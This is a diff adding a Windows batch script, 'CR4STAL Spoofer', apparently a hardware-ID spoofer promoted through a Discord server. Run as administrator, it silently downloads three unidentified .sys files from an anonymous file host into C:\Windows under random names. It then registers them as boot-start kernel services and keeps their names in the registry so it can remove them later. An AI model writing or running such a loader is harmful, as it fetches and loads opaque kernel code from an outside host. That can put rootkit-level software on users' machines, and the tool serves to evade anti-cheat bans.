@@ -1,0 +1,159 @@
+ÿþ&cls
+@echo off
+setlocal enabledelayedexpansion
+title CR4STAL Spoofer
+color 0a
+cls
+
+echo discord.gg/GS46MEy7DT
+echo.
+
+:: Check for admin privileges
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    echo [ERROR] This script requires administrator privileges.
+    echo Please right-click and select "Run as administrator"
+    echo.
+    pause
+    exit /b 1
+)
+
+echo [INFO] Administrator privileges confirmed.
+echo.
+
+:: Registry key for spoofer persistence
+set "REG_KEY=HKEY_CURRENT_USER\SOFTWARE\CR4STAL\Spoofer"
+
+:: Check if spoofer is installed
+for /f "tokens=3" %%a in ('reg query "%REG_KEY%" /v "Driver1Name" 2^>nul') do set "driver1_name=%%a"
+
+if defined driver1_name (
+    echo [INFO] Spoofer is currently INSTALLED
+    echo.
+    echo [1] Remove Spoofer
+    echo [2] Exit
+    echo.
+    set /p "choice=Enter your choice: "
+    
+    :: Trim whitespace and debug
+    set "choice=!choice: =!"
+    echo [DEBUG] Choice entered: "!choice!"
+    
+    if "!choice!"=="1" goto :remove_spoofer
+    if "!choice!"=="2" goto :exit
+    echo Invalid choice: "!choice!"
+    pause
+    exit /b 0
+) else (
+    echo [INFO] Spoofer is NOT INSTALLED
+    echo.
+    echo [1] Install Spoofer
+    echo [2] Exit
+    echo.
+    set /p "choice=Enter your choice: "
+    
+    :: Trim whitespace and debug
+    set "choice=!choice: =!"
+    echo [DEBUG] Choice entered: "!choice!"
+    
+    if "!choice!"=="1" goto :add_spoofer
+    if "!choice!"=="2" goto :exit
+    echo Invalid choice: "!choice!"
+    pause
+    exit /b 0
+)
+
+:: Add spoofer function
+:add_spoofer
+echo.
+echo [INFO] Installing spoofer...
+
+:: Generate random driver names
+set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+set "driver1_name="
+set "driver2_name="
+set "driver3_name="
+
+for /L %%i in (1,1,10) do (
+    set /a "rand=!random! %% 62"
+    for %%j in (!rand!) do set "driver1_name=!driver1_name!!chars:~%%j,1!"
+)
+for /L %%i in (1,1,10) do (
+    set /a "rand=!random! %% 62"
+    for %%j in (!rand!) do set "driver2_name=!driver2_name!!chars:~%%j,1!"
+)
+for /L %%i in (1,1,10) do (
+    set /a "rand=!random! %% 62"
+    for %%j in (!rand!) do set "driver3_name=!driver3_name!!chars:~%%j,1!"
+)
+
+echo [INFO] Generated driver names: !driver1_name!, !driver2_name!, !driver3_name!
+
+:: Download drivers
+echo [INFO] Downloading drivers...
+powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://files.catbox.moe/8n0ulb.sys' -OutFile 'C:\Windows\!driver1_name!.sys' -UseBasicParsing}" >nul 2>&1
+powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://files.catbox.moe/6g21xn.sys' -OutFile 'C:\Windows\!driver2_name!.sys' -UseBasicParsing}" >nul 2>&1
+powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://files.catbox.moe/wpdvez.sys' -OutFile 'C:\Windows\!driver3_name!.sys' -UseBasicParsing}" >nul 2>&1
+
+:: Create services
+echo [INFO] Creating services...
+sc create "!driver1_name!" binPath= "C:\Windows\!driver1_name!.sys" type= kernel start= boot >nul 2>&1
+sc create "!driver2_name!" binPath= "C:\Windows\!driver2_name!.sys" type= kernel start= boot >nul 2>&1
+sc create "!driver3_name!" binPath= "C:\Windows\!driver3_name!.sys" type= kernel start= boot >nul 2>&1
+
+:: Save to registry
+reg add "%REG_KEY%" /v "Driver1Name" /t REG_SZ /d "!driver1_name!" /f >nul 2>&1
+reg add "%REG_KEY%" /v "Driver2Name" /t REG_SZ /d "!driver2_name!" /f >nul 2>&1
+reg add "%REG_KEY%" /v "Driver3Name" /t REG_SZ /d "!driver3_name!" /f >nul 2>&1
+reg add "%REG_KEY%" /v "InstallDate" /t REG_SZ /d "%date% %time%" /f >nul 2>&1
+
+echo [SUCCESS] Spoofer installed successfully!
+pause
+exit /b 0
+
+:: Remove spoofer function
+:remove_spoofer
+echo.
+echo [INFO] Removing spoofer...
+
+:: Load driver names from registry
+for /f "tokens=3" %%a in ('reg query "%REG_KEY%" /v "Driver1Name" 2^>nul') do set "driver1_name=%%a"
+for /f "tokens=3" %%a in ('reg query "%REG_KEY%" /v "Driver2Name" 2^>nul') do set "driver2_name=%%a"
+for /f "tokens=3" %%a in ('reg query "%REG_KEY%" /v "Driver3Name" 2^>nul') do set "driver3_name=%%a"
+
+if not defined driver1_name (
+    echo [ERROR] No spoofer configuration found.
+    pause
+    exit /b 1
+)
+
+echo [INFO] Found drivers: %driver1_name%, %driver2_name%, %driver3_name%
+
+:: Remove services
+echo [INFO] Removing services...
+sc config "%driver1_name%" start= disabled >nul 2>&1
+sc delete "%driver1_name%" >nul 2>&1
+sc config "%driver2_name%" start= disabled >nul 2>&1
+sc delete "%driver2_name%" >nul 2>&1
+sc config "%driver3_name%" start= disabled >nul 2>&1
+sc delete "%driver3_name%" >nul 2>&1
+
+:: Remove files
+echo [INFO] Removing files...
+if exist "C:\Windows\%driver1_name%.sys" del "C:\Windows\%driver1_name%.sys"
+if exist "C:\Windows\%driver2_name%.sys" del "C:\Windows\%driver2_name%.sys"
+if exist "C:\Windows\%driver3_name%.sys" del "C:\Windows\%driver3_name%.sys"
+
+:: Remove registry
+reg delete "%REG_KEY%" /f >nul 2>&1
+
+echo [SUCCESS] Spoofer removed successfully!
+pause
+exit /b 0
+
+:: Exit function
+:exit
+echo.
+echo [INFO] Exiting...
+timeout /t 2 >nul
+exit /b 0
